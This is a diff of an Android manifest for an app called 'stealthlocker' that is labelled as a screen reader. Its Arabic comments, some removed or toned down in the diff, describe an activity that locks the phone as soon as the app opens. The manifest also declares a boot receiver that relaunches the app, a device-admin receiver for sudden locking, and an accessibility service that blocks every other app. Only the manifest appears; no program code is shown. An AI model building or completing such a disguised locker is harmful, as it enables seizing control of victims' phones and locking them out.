@@ -2,7 +2,6 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.stealthlocker">
 
-    <!-- أذونات الإقلاع، التراكب، الاستيقاظ، وإلغاء قفل النظام الأساسية -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
@@ -13,7 +12,7 @@
         android:label="أداة قراءة الشاشة"
         android:theme="@style/Theme.AppCompat.NoActionBar">
 
-        <!-- الواجهة الأولى التي تفتح عند النقر على التطبيق (تتحول فوراً للقفل وتغفي الهاتف) -->
+        <!-- واجهة القفل الحصينة الأساسية -->
         <activity 
             android:name=".PasswordLockActivity" 
             android:exported="true"
@@ -26,10 +25,9 @@
             </intent-filter>
         </activity>
 
-        <!-- شاشة القفل أو الواجهات الأخرى التابعة للتطبيق -->
         <activity android:name=".MainActivity" android:exported="false" />
 
-        <!-- مُستقبل إعادة تشغيل الهاتف لفتح التطبيق فور الإقلاع -->
+        <!-- مستقبل الإقلاع -->
         <receiver 
             android:name=".BootReceiver" 
             android:enabled="true" 
@@ -38,12 +36,11 @@
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.REBOOT" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </receiver>
 
-        <!-- مُستقبل صلاحيات مسؤول الجهاز (المسؤول عن تنفيذ الإغفاء والقفل المفاجئ للشاشة) -->
+        <!-- مستقبل مسؤول الجهاز -->
         <receiver
             android:name=".MyAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -56,7 +53,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- الخدمة الخفية التي تتحكم بالأزرار -->
+        <!-- خدمة إمكانية الوصول لمنع فتح أي تطبيق آخر -->
         <service
             android:name=".MyAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
